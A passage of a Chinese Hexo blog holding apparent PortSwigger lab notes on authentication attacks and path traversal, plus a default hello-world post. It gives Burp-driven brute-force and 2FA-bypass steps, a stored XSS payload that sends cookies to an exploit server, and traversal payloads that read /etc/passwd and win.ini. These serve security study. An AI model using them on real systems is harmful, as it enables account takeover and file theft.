class="built_in">open</span>(output_file,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)<span class="keyword">as</span> outfile:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> infile:</span><br><span class="line">        outfile.write(line.rstrip(<span class="string">&quot;\n&quot;</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        outfile.write(<span class="string">&quot;peter\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">infile.close()</span><br><span class="line">outfile.close()</span><br></pre></td></tr></table></figure>

<p>重点：缺陷模式需要控制发包的顺序——并发速度，而且需要会懂基础的脚本撰写。</p>
<h2 id="Lab-Username-enumeration-via-account-lock"><a href="#Lab-Username-enumeration-via-account-lock" class="headerlink" title="Lab: Username enumeration via account lock"></a>Lab: Username enumeration via account lock</h2><p>网站试图防止暴力破解的一种方法是，如果满足某些可疑条件（通常是登录失败的次数），就锁定帐户。与正常的登录错误一样，来自服务器的指示帐户被锁定的响应也可以帮助攻击者枚举用户名。</p>
<p>‍</p>
<ol>
<li>运行Burp Suite，调查登录页面并提交无效的用户名和密码。将POST &#x2F;login请求发送到Burp Intruder。</li>
<li>从攻击类型下拉菜单中选择“Cluster bomb attack”（集群炸弹攻击）。向用户名参数添加一个有效负载位置。通过单击“Add §”在请求正文的末尾添加一个空白有效负载位置。结果应该看起来像这样：username&#x3D;§invalid-username§&amp;password&#x3D;example§§。</li>
<li>在“Payloads”（有效负载）侧边栏中，为第一个有效负载位置添加用户名列表。对于第二个有效负载位置，选择“Null payloads”（空有效负载）类型，并选择生成5个有效负载的选项。这将有效地使每个用户名重复5次。开始攻击。</li>
<li>在结果中，注意到一个用户名的响应比其他用户名的响应要长。仔细研究响应，注意到它包含一个不同的错误消息：“您输入的登录信息有误”。记下这个用户名。</li>
<li>在POST &#x2F;login请求上创建一个新的Burp Intruder攻击，但这次从攻击类型下拉菜单中选择“Sniper attack”（狙击手攻击）。将用户名参数设置为刚刚确定的用户名，并向密码参数添加一个有效负载位置。</li>
<li>将密码列表添加到有效负载集中，并为错误消息创建一个grep提取规则。开始攻击。</li>
<li>在结果中，查看grep提取列。注意，有几个不同的错误消息，但其中一个响应不包含任何错误消息。记下这个密码。<br>等待一分钟以允许账户锁定重置。使用确定的用户名和密码登录，访问用户账户页面以解决实验室问题。</li>
</ol>
<p><img src="/images/image-20251115173125-ss5bg7t.png" alt="image"></p>
<p><img src="/images/image-20251115173613-78szps8.png" alt="image"></p>
<h2 id="Lab-2FA-simple-bypass"><a href="#Lab-2FA-simple-bypass" class="headerlink" title="Lab: 2FA simple bypass"></a>Lab: 2FA simple bypass</h2><p>这个实验室的双重认证是可以绕过的。您已经获得了有效的用户名和密码，但无法访问用户的2FA验证码。要解决实验室的问题，请访问卡洛斯的账户页面。</p>
<ul>
<li>Your credentials: <code>wiener:peter</code></li>
<li>Victim’s credentials <code>carlos:montoya</code></li>
</ul>
<p>‍</p>
<p>登录到您自己的账户。您的2FA验证码将通过电子邮件发送给您。单击“电子邮件客户端”按钮以访问您的电子邮件。</p>
<p><img src="/images/image-20251115185818-7j4772y.png" alt="image"></p>
<p><img src="/images/image-20251115185915-x9ppfwg.png" alt="image"><br>转到您的账户页面并记下URL。</p>
<p><img src="/images/image-20251115190137-43jvi3e.png" alt="image"><br>注销您的账户。<br>使用受害者的凭据登录。<br>当系统提示输入验证码时，手动更改URL以导航到&#x2F;my-account。页面加载时，实验即告解决。</p>
<p><img src="/images/image-20251115190151-mrbu8dq.png" alt="image"></p>
<p>‍</p>
<h2 id="Lab-2FA-bypass-using-a-brute-force-attack"><a href="#Lab-2FA-bypass-using-a-brute-force-attack" class="headerlink" title="Lab: 2FA bypass using a brute-force attack"></a>Lab: 2FA bypass using a brute-force attack</h2><p>网站会在输入错误的验证码后注销用户，但是可以通过宏来自动化登录。</p>
<p>‍</p>
<p>Victim’s credentials: <code>carlos:montoya</code></p>
<p>与密码一样，网站也需要采取措施来防止暴力破解双因素认证验证码。这一点尤为重要，因为验证码通常是一个简单的4位或6位数字。如果没有足够的暴力破解保护，破解这样的代码是微不足道的。</p>
<p>一些网站试图通过在用户输入一定数量的错误验证码后自动将其注销来防止这种情况。但在实践中这是无效的，因为高级攻击者甚至&#x3D;&#x3D;可以通过为Burp Intruder创建宏来自动化这个多步骤过程&#x3D;&#x3D;。Turbo Intruder扩展也可以用于此目的。</p>
<p>这个实验室的双因素认证容易受到暴力攻击。你已经获得了有效的用户名和密码，但没有访问用户的2FA验证码。为了解决这个实验室的问题，对2FA代码进行暴力破解，并访问Carlos的账户页面。</p>
<p>由于验证码将在您运行攻击时重置，因此您可能需要多次重复此攻击才能成功。这是因为新的代码可能是您当前的入侵者攻击已经尝试过的数字。</p>
<p>‍</p>
<p>‍</p>
<ol>
<li>在运行Burp的情况下，以carlos的身份登录并调查2FA验证过程。请注意，如果您两次输入错误的代码，您将再次被注销。您需要使用Burp的会话处理功能，在发送每个请求之前自动登录。</li>
<li>在Burp中，单击“设置”以打开“setting”对话框，然后单击“sessions”。在“session handling rules ”面板中，单击“add”。</li>
</ol>
<p><img src="/images/image-20251115195210-nsjmt2c.png" alt="image"><br>在对话框中，转到“范围”选项卡。在“URL范围”下，选择“包含所有URL”选项。</p>
<p><img src="/images/image-20251115195453-jhs9gl9.png" alt="image"><br>返回“详细信息”选项卡，在“规则操作”下，单击“添加”&gt;“运行宏”。</p>
<p>‍</p>
<p><img src="/images/image-20251115195527-dtwxdif.png" alt="image"><br>在“选择宏”下，单击“添加”以打开“宏记录器”。选择以下3个请求：然后单击“确定”。“宏编辑器”对话框将打开。要按住ctrl键来选择</p>
<p><img src="/images/image-20251115200747-ooqf5yi.png" alt="image"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /login</span><br><span class="line">POST /login</span><br><span class="line">GET /login2</span><br></pre></td></tr></table></figure>

<p>单击“测试宏”，并检查最终响应是否包含要求您提供4位数安全代码的页面。这将确认宏工作正常。</p>
<p><img src="/images/image-20251115201831-7j9gils.png" alt="image">​<br>继续单击“确定”以关闭各个对话框，直到返回Burp主窗口。&#x3D;&#x3D;现在，在Burp Intruder发送每个请求之前，宏将自动为您登录Carlos。&#x3D;&#x3D;</p>
<p>‍</p>
<p>将POST &#x2F;login2请求发送到Burp Intruder。</p>
<p><img src="/images/image-20251115202005-x1u905l.png" alt="image"><br>在Burp Intruder中，向mfa-code参数添加一个有效负载位置。<br>在“有效负载”侧边栏中，选择“数字”有效负载类型。输入范围0 - 9999，并将步进设置为1。将最小&#x2F;最大整数位数设置为4，最大小数位数设置为0。这将为每个可能的4位数整数创建一个有效负载。<br>单击“资源池”以打开“资源池”侧边栏。将攻击添加到“最大并发请求”设置为1的资源池中。<br>开始攻击。最终，其中一个请求将返回302状态代码。右键单击此请求，然后选择“在浏览器中显示响应”。复制URL并在浏览器中加载。</p>
<p><img src="/images/image-20251115202257-m1hnhli.png" alt="image"><br>单击“我的账户”以解决实验室问题。</p>
<p><img src="/images/image-20251115220858-i7bd627.png" alt="image"></p>
<h2 id="Lab-Offline-password-cracking"><a href="#Lab-Offline-password-cracking" class="headerlink" title="Lab: Offline password cracking"></a>Lab: Offline password cracking</h2><p>本实验室将用户的密码散列存储在cookie中。该实验室在评论功能中还包含一个XSS漏洞。要破解实验室，获取carlos的永久登录cookie并使用它来破解他的密码。然后，以carlos的身份登录，并从“我的帐户”页面删除他的帐户。</p>
<ul>
<li>Your credentials: <code>wiener:peter</code></li>
<li>Victim’s username: <code>carlos</code></li>
</ul>
<p><img src="/images/image-20251116145936-ptopecr.png" alt="image"></p>
<ol>
<li>在运行 Burp 的情况下，使用您自己的账户来检查“保持登录”功能。请注意，保持登录的 cookie 是经过 Base64 编码的。<br>在“代理”&gt;“HTTP 历史记录”选项卡中，转到您登录请求的响应，并突出显示“保持登录”cookie，以查看其构造如下：username ‘:’ md5HashOfPassword</li>
</ol>
<p><img src="/images/image-20251116150256-4292dx5.png" alt="image"></p>
<ol start="2">
<li>您现在需要窃取受害者用户的 cookie。请注意，评论功能容易受到 XSS 攻击。<br>记下回传的地址：<a target="_blank" rel="noopener" href="https://exploit-0a85001a0416728c80b92a9601d100df.exploit-server.net/">https://exploit-0a85001a0416728c80b92a9601d100df.exploit-server.net/</a></li>
<li>转到其中一个博客，并发布一个包含以下存储型 XSS 有效负载的评论，请记住输入您自己的攻击服务器 ID：</li>
</ol>
<p>​<code>&lt;script&gt;document.location=&#39;https://exploit-0a85001a0416728c80b92a9601d100df.exploit-server.net/exploit&#39;+document.cookie</code></script></p>
<p><img src="/images/image-20251116151923-b4xjyy3.png" alt="image"><br>在攻击服务器上，打开访问日志。应该有一个来自受害者的 GET 请求，其中包含他们的“保持登录”cookie。</p>
<p><img src="/images/image-20251116152225-u58re5e.png" alt="image"><br>在 Burp 解码器中解码 cookie。结果将是：carlos:26323c16d5f4dabff3bb136f2460a943<br>复制哈希值并将其粘贴到搜索引擎中。这将显示密码是 onceuponatime。<br>登录受害者的账户，转到“我的账户”页面，然后删除他们的账户以解决实验室问题。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>‍</p>
<p>‍</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/" data-id="cmkbf3udr0000ewvs12j9adbg" data-title="2.Authentication身份验证" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-路径遍历" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/08/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" class="article-date">
  <time class="dt-published" datetime="2026-01-07T19:41:15.000Z" itemprop="datePublished">2026-01-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/portswigger/">portswigger</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/08/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/">1.路径穿越</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>修订时间：2025.12.7</p>
<p>引用链接：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-path-traversal">https://portswigger.net/web-security/file-path-traversal</a></p>
<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/3328367">https://hackerone.com/reports/3328367</a></p>
<h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>漏洞原因：将用户提供的输入传递给文件系统API，如果无法避免将用户提供的输入传递给文件系统API，使用两层防御来防止攻击：<br>• 在处理用户输入之前先验证用户输入。理想情况下，将用户输入与允许的值白名单进行比较。如果不可能，请验证输入是否只包含允许的内容，例如仅限字母数字字符。<br>• 在验证提供的输入后，将输入追加到基本目录，并使用平台文件系统API对路径进行规范化。验证规范化路径是否以预期的基本目录开头。以下是基于用户输入验证文件规范化路径的一些简单Java代码示例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">File</span> file = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable constant_">BASE_DIRECTORY</span>, userInput);</span><br><span class="line"><span class="keyword">if</span> (file.<span class="title function_">getCanonicalPath</span>().<span class="title function_">startsWith</span>(<span class="variable constant_">BASE_DIRECTORY</span>)) &#123;</span><br><span class="line">    <span class="comment">// process file</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下为常见的路径遍历：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;/loadImage?filename=218.png&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实际位置在<code>/var/www/images/218.png</code>穿越到&#x2F;etc&#x2F;passwd：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/loadImage?filename=../../../etc/passwd</span><br></pre></td></tr></table></figure>

<h1 id="2-利用路径遍历漏洞的常见障碍"><a href="#2-利用路径遍历漏洞的常见障碍" class="headerlink" title="2.利用路径遍历漏洞的常见障碍"></a>2.利用路径遍历漏洞的常见障碍</h1><p>如果一个应用程序从用户提供的文件名中剥离或阻止目录遍历序列，那么可能会使用多种技术来绕过防御措施。</p>
<h2 id="2-1-嵌套遍历"><a href="#2-1-嵌套遍历" class="headerlink" title="2.1 嵌套遍历"></a>2.1 嵌套遍历</h2><p>嵌套遍历序列，例如….&#x2F;&#x2F;或…./。当剥离内部序列时，这些将恢复为简单的遍历序列。</p>
<ol>
<li><p><strong>应用层过滤的局限性</strong>很多程序会直接扫描输入中的 “..&#x2F;“ 字符串并替换为空，以此阻止路径遍历。&#x3D;&#x3D;但如果输入是嵌套形式，比如 “….&#x2F;&#x2F;“，简单的替换逻辑可能只处理掉一层。例如，将 “….&#x2F;&#x2F;“ 中的一个 “..&#x2F;“ 替换后，剩余的字符会重新组合成新的 “..&#x2F;“，从而绕过过滤。&#x3D;&#x3D;</p>
</li>
<li><p><strong>文件系统的路径规范化</strong>操作系统的文件系统在处理路径时，会自动进行 “规范化” 操作，也就是递归解析所有的 “..&#x2F;“ 和 “.&#x2F;“。无论输入的序列多么复杂，只要最终能组合成有效的上级目录跳转指令，文件系统都会执行。比如：</p>
<ul>
<li>“….&#x2F;&#x2F;“ 会被解析为 “..&#x2F;“ + “..&#x2F;“，即向上跳转两级。</li>
<li>“….&#x2F;“ 可能被解析为 “..&#x2F;“ + “.&#x2F;“，即向上跳转一级。</li>
</ul>
</li>
<li><p><strong>路径解析顺序的差异</strong>攻击的关键就在于利用 “应用层过滤” 和 “文件系统解析” 的顺序差。应用程序先过滤，但没过滤干净；文件系统后解析，把残留的字符组合成有效路径，最终实现了绕过。</p>
</li>
</ol>
<h2 id="2-2-混用正斜杠和反斜杠"><a href="#2-2-混用正斜杠和反斜杠" class="headerlink" title="2.2 混用正斜杠和反斜杠"></a>2.2 混用正斜杠和反斜杠</h2><p><img src="/images/image-20251207121121-gb3pj8u.png" alt="image"></p>
<p>利用反斜杠（\）与正斜杠（&#x2F;）的混用，绕过只检测正斜杠的过滤</p>
<h2 id="2-3-双重URL编码"><a href="#2-3-双重URL编码" class="headerlink" title="2.3 双重URL编码"></a>2.3 双重URL编码</h2><p>对于Burp Suite Professional用户，Burp Intruder提供了预定义的负载列表Fuzzing - path traversal。它包含一些可以尝试的编码路径遍历序列。</p>
<p>在某些情况下，如URL路径或multipart &#x2F; form-data请求的filename参数中，Web服务器可能会在将输入传递给应用程序之前剥离任何目录遍历序列。</p>
<p>有时可以通过URL编码甚至双重URL编码来绕过这种清理，即..&#x2F;字符。这将分别导致%2e%2e%2f 和   %25%2e%25%2e%25%2f<br>各种非标准编码，如..%c0%af  或%8f，也可能有效。</p>
<p>‍</p>
<h3 id="2-3-1-c0-af-的原理："><a href="#2-3-1-c0-af-的原理：" class="headerlink" title="2.3.1 ..%c0%af 的原理："></a>2.3.1 ..%c0%af 的原理：</h3><p>在UTF-8编码中，&#x2F; 的标准编码是 2f (十六进制)。%c0%af 是UTF-8字符集中 非规范的（或称为”过长”） 编码方式来表示 &#x2F; 字符。</p>
<p>清理机制阶段： 清理机制可能只识别并过滤标准编码的 %2f 或未编码的 &#x2F;。当它看到 %c0%af 时，因为这不是标准的 &#x2F; 编码形式，所以无法识别和拦截。</p>
<p>应用程序阶段： 许多现代编程语言和操作系统在处理路径时，底层会调用 UTF-8 解码 函数。这些函数通常被设计为接受并规范化过长的UTF-8表示，因此会将非规范的 %c0%af 正确地解码 为 &#x2F; 字符。最终，输入被还原为 ..&#x2F;，绕过清理。</p>
<h3 id="2-3-2-8f-的原理："><a href="#2-3-2-8f-的原理：" class="headerlink" title="2.3.2 %8f 的原理："></a>2.3.2 %8f 的原理：</h3><p> 这种形式通常是利用 IIS（Microsoft Internet Information Services） Web服务器的特定漏洞。在特定的IIS版本和配置中，IIS可能会将一些非标准的单字节或双字节编码（如 %8f、%e0 等，它们本身并不是合法的UTF-8表示）在处理路径时错误地映射或截断，最终导致 &#x2F; 字符的出现或路径解析错误。</p>
<h2 id="2-4-文件开头"><a href="#2-4-文件开头" class="headerlink" title="2.4 文件开头"></a>2.4 文件开头</h2><p>应用程序可能要求用户提供的文件名以预期的基本文件夹开头，例如&#x2F;var&#x2F;www&#x2F;images在这种情况下，可能包括所需的基本文件夹，然后是合适的遍历序列。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/var/www/images/../../../etc/passwd。</span><br></pre></td></tr></table></figure>

<h2 id="2-5-空字节绕过"><a href="#2-5-空字节绕过" class="headerlink" title="2.5 空字节绕过"></a>2.5 空字节绕过</h2><p>应用程序可能要求用户提供的文件名以预期的文件扩展名结尾，例如.png。在这种情况下，可以使用空字节在所需扩展名之前有效地终止文件路径。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=../../../etc/passwd%00.png</span><br></pre></td></tr></table></figure>
<p>‍</p>
<h1 id="3-一些报告的思路"><a href="#3-一些报告的思路" class="headerlink" title="3.一些报告的思路"></a>3.一些报告的思路</h1><h2 id="3-1-CWE-28-Path-Traversal-‘-filedir"><a href="#3-1-CWE-28-Path-Traversal-‘-filedir" class="headerlink" title="3.1  CWE-28: Path Traversal: ‘..\filedir"></a>3.1  CWE-28: Path Traversal: ‘..\filedir</h2><p>Windows 操作系统或某些网络协议（如 SMB&#x2F;CIFS）的文件路径约定。</p>
<ul>
<li>假设应用程序旨在让用户访问日志目录下的文件，例如 <code>C:\App\Logs\</code>​。用户输入 <code>access.log</code>​。程序拼接后读取 <code>C:\App\Logs\access.log</code>。</li>
<li><strong>攻击行为：</strong>  攻击者在用户输入中注入 Windows 风格的向上遍历序列：​ <strong>​<code>..\..\..\Windows\win.ini</code>​</strong>。</li>
<li>结果： 应用程序将恶意输入与基路径拼接：\text{Full Path} &#x3D; \text{“C:\App\Logs&quot;} + \text{“......\Windows\win.ini”}</li>
</ul>
<p>‍</p>
<h2 id="3-2-CWE-39-Path-Traversal-‘C-dirname’"><a href="#3-2-CWE-39-Path-Traversal-‘C-dirname’" class="headerlink" title="3.2 CWE-39: Path Traversal: ‘C:dirname’"></a>3.2 CWE-39: Path Traversal: ‘C:dirname’</h2><p><strong>利用了 Windows 操作系统处理路径中</strong>盘符（Drive Letter）的特殊机制来绕过安全检查。</p>
<p>假设 Web 应用程序的安全文件根目录位于 <code>D:\WebRoot\data\</code>，并且它只想允许用户访问这个目录下的文件。</p>
<p>攻击者构造一个包含另一个盘符（例如 <code>C:</code>）的输入：</p>
<ul>
<li><strong>攻击者输入：</strong>  <code>C:..\..\..\Windows\win.ini</code></li>
</ul>
<p>应用程序将用户输入与其他参数结合，并进行文件操作。如果它没有检查输入中的盘符：</p>
<ul>
<li><p><strong>应用程序当前工作目录 (CWD)：</strong>  假设应用程序进程的 CWD 正好在 <code>C:\Users\AppUser\</code>。</p>
</li>
<li><p><strong>输入解析：</strong>  当 Windows 看到 <code>C:..\..\..\Windows\win.ini</code> 时，它会将路径解释为：</p>
<ol>
<li>切换到 <code>C:</code> 盘。</li>
<li>从 <code>C:</code>​ 盘的<strong>当前工作目录</strong> (<code>C:\Users\AppUser\</code>​) 开始，应用相对路径 <code>..\..\..\Windows\win.ini</code>。</li>
</ol>
</li>
<li><p><strong>路径遍历：</strong></p>
<ul>
<li><code>..\</code>​ 跳出 <code>AppUser</code> $\rightarrow$ <code>C:\Users\</code></li>
<li><code>..\</code>​ 跳出 <code>Users</code> $\rightarrow$ <code>C:\</code></li>
<li><code>..\</code>​ 停在 <code>C:\</code></li>
<li><strong>最终访问的路径：</strong>  <code>C:\Windows\win.ini</code></li>
</ul>
</li>
</ul>
<h2 id="3-3-CWE-40-Path-Traversal-‘-UNC-share-name-Windows-UNC-Share"><a href="#3-3-CWE-40-Path-Traversal-‘-UNC-share-name-Windows-UNC-Share" class="headerlink" title="3.3  CWE-40: Path Traversal: ‘\UNC\share\name&#39; (Windows UNC Share)"></a>3.3  CWE-40: Path Traversal: ‘\UNC\share\name&#39; (Windows UNC Share)</h2><p>UNC 共享是一种在 <strong>Windows 网络环境</strong>中指定共享资源（如文件、文件夹、打印机）位置的命名约定或格式。它是访问网络资源的<strong>标准语法</strong>。</p>
<p>UNC 路径总是以两个反斜杠 <code>\\</code> 开头，后跟计算机名称，然后是共享资源的名称。</p>
<table>
<thead>
<tr>
<th><strong>组成部分</strong></th>
<th><strong>示例</strong></th>
<th><strong>说明</strong></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>​ <strong>​<code>\\</code>​</strong></td>
<td>​<code>\\</code></td>
<td>必需。表示这是一个 UNC 网络路径。</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>​<strong>​<code>ComputerName</code>​</strong></td>
<td>​<code>\\ServerA</code></td>
<td>托管资源的计算机或服务器的​<strong>网络名称</strong>​（NetBIOS Name）或​<strong>IP 地址</strong>。</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>​<strong>​<code>ShareName</code>​</strong></td>
<td>​<code>\\ServerA\Projects</code></td>
<td>计算机上<strong>已共享</strong>的文件夹或设备的名称。</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>​<strong>​<code>OptionalPath</code>​</strong></td>
<td>​<code>\\ServerA\Projects\Report.docx</code></td>
<td>共享文件夹内的文件或子文件夹的完整路径。</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>‍</p>
<p>假设一个应用程序有一个名为“文件处理服务”的功能，它接收一个文件名，并预期在本地的临时目录中找到并处理该文件。</p>
<p><strong>应用预期代码逻辑（假设在 Windows 服务器上）：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 应用程序的本地临时目录</span><br><span class="line">TEMP_DIR = &quot;C:\App\Temp\&quot;</span><br><span class="line"></span><br><span class="line">// 接收用户输入的文件名</span><br><span class="line">user_input = get_param(&quot;filename&quot;) // 预期输入：data.tmp</span><br><span class="line"></span><br><span class="line">// 拼接路径</span><br><span class="line">full_path = TEMP_DIR + user_input  // 结果：C:\App\Temp\data.tmp</span><br><span class="line"></span><br><span class="line">// 对文件执行操作（如读取、写入、移动等）</span><br><span class="line">process_file(full_path) </span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>由于应用程序只检查了本地路径的合法性，但未能检查输入是否以 <code>\\</code> 开头，攻击者可以注入一个完整的 UNC 路径。</p>
<p>攻击者构造一个指向网络上另一台服务器共享资源的 UNC 路径。</p>
<ul>
<li><strong>攻击者输入</strong> <strong>​<code>filename</code>​</strong>​ <strong>参数：</strong>  <code>\\EvilServer\Share\sensitive.dat</code></li>
</ul>
<p>应用程序简单地将这个输入拼接到 <code>TEMP_DIR</code>​ 之后：\text{Full Path} &#x3D; \text{“C:\App\Temp&quot;} + \text{“\EvilServer\Share\sensitive.dat”}</p>
<p>在 Windows 文件系统和 API 中，如果一个路径包含 ​<strong>两个连续的反斜杠</strong>  <strong>​<code>\\</code>​</strong> ​，操作系统会将其解释为​<strong>网络路径</strong>​，并尝试忽略其前面的本地路径部分（<code>C:\App\Temp\</code>）。</p>
<ul>
<li><strong>最终系统尝试访问的路径：</strong>  <code>\\EvilServer\Share\sensitive.dat</code></li>
</ul>
<p>‍</p>
<h2 id="3-4-Path-traversal-via-archive-extract-CVE-2021-3281-incomplete-patch"><a href="#3-4-Path-traversal-via-archive-extract-CVE-2021-3281-incomplete-patch" class="headerlink" title="3.4 Path traversal via archive.extract - CVE 2021-3281 incomplete patch"></a>3.4 Path traversal via archive.extract - CVE 2021-3281 incomplete patch</h2><p>‍</p>
<h3 id="1-漏洞核心：部分路径遍历-Partial-Path-Traversal"><a href="#1-漏洞核心：部分路径遍历-Partial-Path-Traversal" class="headerlink" title="1. 漏洞核心：部分路径遍历 (Partial Path Traversal)"></a>1. 漏洞核心：部分路径遍历 (Partial Path Traversal)</h3><ul>
<li><p><strong>漏洞类型</strong>：路径遍历 (CWE-22)。具体来说，是“部分路径遍历”。</p>
</li>
<li><p><strong>受影响组件</strong>​：<code>django.utils.archive.extract</code>​ 函数（涉及 <code>ZipArchive</code>​ 和 <code>TarArchive</code> 类）。</p>
</li>
<li><p><strong>CVE 编号</strong>：CVE-2025-59682（注意：这是报告中提到的新编号，修复了旧 CVE-2021-3281 的遗留问题）。</p>
</li>
<li><p><strong>根本原因</strong>​： 在之前的修复中，Django 使用 <code>os.path.abspath</code>​ 和 <code>startswith</code> 来检查解压路径是否在目标目录内。 代码逻辑大致如下：<br>Python</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target_path = os.path.abspath(to_path) # 例如 /var/lib</span><br><span class="line">filename = os.path.abspath(os.path.join(target_path, name)) # 例如 /var/library/test.txt</span><br><span class="line">if not filename.startswith(target_path): # 检查 /var/library/test.txt 是否以 /var/lib 开头</span><br><span class="line">    raise SuspiciousOperation(...)</span><br></pre></td></tr></table></figure>

<p><strong>问题在于</strong>​：<code>os.path.abspath(&quot;/var/lib/&quot;)</code>​ 会移除末尾的斜杠，变成 <code>/var/lib</code>​。因此，如果攻击者构造一个文件名解压到 <code>/var/library/test.txt</code>​，因为 <code>/var/library</code>​ 确实以 <code>/var/lib</code>​ 字符开头，所以 <code>startswith</code>​ 检查会​<strong>通过</strong>​。这允许攻击者将文件写入到与目标目录名称相似的兄弟目录中（例如，目标是 <code>/home/john</code>​，攻击者可以写入 <code>/home/johnny</code>）。</p>
</li>
</ul>
<h3 id="2-攻击场景与-PoC"><a href="#2-攻击场景与-PoC" class="headerlink" title="2. 攻击场景与 PoC"></a>2. 攻击场景与 PoC</h3><p>报告者 <code>stackered</code> 提供了一个非常清晰的 PoC：</p>
<ol>
<li><p><strong>场景假设</strong>​：假设系统中存在两个用户目录 <code>/home/john</code>​ (目标目录) 和 <code>/home/johnny</code> (攻击目标)。</p>
</li>
<li><p><strong>攻击构造</strong>：</p>
<ul>
<li>创建一个恶意 ZIP 文件。</li>
<li>包含一个指向 <code>/home/johnny/.ssh/authorized_keys</code> 的文件条目。</li>
<li>包含一个普通文件（用于绕过某些前置检查）。</li>
</ul>
</li>
<li><p><strong>执行过程</strong>：</p>
<ul>
<li>调用 <code>archive.extract(&quot;/home/john&quot;)</code>。</li>
<li>由于 <code>/home/johnny...</code>​ 以 <code>/home/john</code> 开头，防御逻辑失效。</li>
<li>恶意文件被成功写入 <code>/home/johnny/.ssh/authorized_keys</code>​，可能导致 SSH 密钥注入，从而获取 <code>johnny</code> 用户的权限。</li>
</ul>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/01/08/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" data-id="cmkbf3udx0003ewvscil8cmv4" data-title="1.路径穿越" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/05/hello-world/" class="article-date">
  <time class="dt-published" datetime="2026-01-04T16:08:36.418Z" itemprop="datePublished">2026-01-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/05/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

